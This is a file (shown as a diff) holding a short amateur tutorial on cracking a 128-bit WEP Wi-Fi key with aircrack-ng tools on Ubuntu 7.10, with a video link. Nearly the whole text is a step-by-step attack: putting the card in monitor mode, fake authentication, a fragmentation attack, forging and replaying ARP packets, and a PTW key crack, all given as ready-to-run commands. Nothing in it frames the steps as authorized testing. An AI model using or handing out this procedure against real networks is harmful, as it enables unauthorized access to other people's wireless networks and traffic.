@@ -1,0 +1,32 @@
+10 Easy Steps to Crack a Wireless WEP Key 128 bit using Ubuntu 7.10
+using Aircrack-ng Tools
+
+This is my First Tutorial
+
+1)sudo airmon-ng start wifi0 (start ur wifi card to monitor mode)
+
+2)sudo wlanconfig ath0 destroy
+
+3)sudo ifconfig ath1 up (makes ur ath1 interface up)
+
+4)sudo iwconfig ath1 mode monitor channel 11 (makes ath1 to set in monitor mode in channel 11)
+
+5)sudo aireplay-ng -1 0 -e linksys -a 00:11:22:33:44:55 -h 00:18:4D:6E:54:79 ath1 ( Sending Authentication Request)
+
+6)sudo aireplay-ng -5 -b 00:11:22:33:44:55 -h 00:18:4D:6E:54:79 ath1 (fragmentation attack)
+
+7)packetforge-ng -0 -a 00:11:22:33:44:55 -h 00:18:4D:6E:54:79 -k 255.255.255.255 -l 255.255.255.255 -y ur xor file.xor -w arp-request (generate an arp packet)
+
+8)sudo airodump-ng -c 11 -bssid 00:11:22:33:44:55 -w capture ath1 (monitors the AP)
+
+9)sudo aireplay-ng -2 -r arp-request ath1 (sending the Arp-request with use interactive frame selection)
+
+
+10)sudo aircrack-ng -z *.cap (capture*.cap selects all dump files starting with "capture" and ending in "cap") "-z ptw attack
+
+and below is the link for the video
+
+http://in.youtube.com/watch?v=Vvok-PBSpFY
+
+
+Punter
